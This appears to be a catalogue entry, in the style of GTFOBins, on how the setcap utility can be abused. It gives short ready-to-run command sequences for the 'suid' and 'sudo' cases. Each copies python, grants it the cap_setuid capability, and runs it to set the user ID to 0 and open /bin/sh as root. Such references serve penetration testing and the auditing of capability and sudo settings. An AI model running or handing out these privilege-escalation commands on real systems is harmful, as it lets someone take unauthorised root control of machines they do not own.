---
description: sets and removes capabilities on files
functions:
  suid:
    - description: Can be used to give and capabilities to other files. cap_setuid for example gives an executable permissions to switch uid.
      code: |
        cp $(which python) .
        setcap cap_setuid+ep python
        ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
  sudo:
    - code: |
        cp $(which python) .
        sudo setcap cap_setuid+ep python
        ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
---
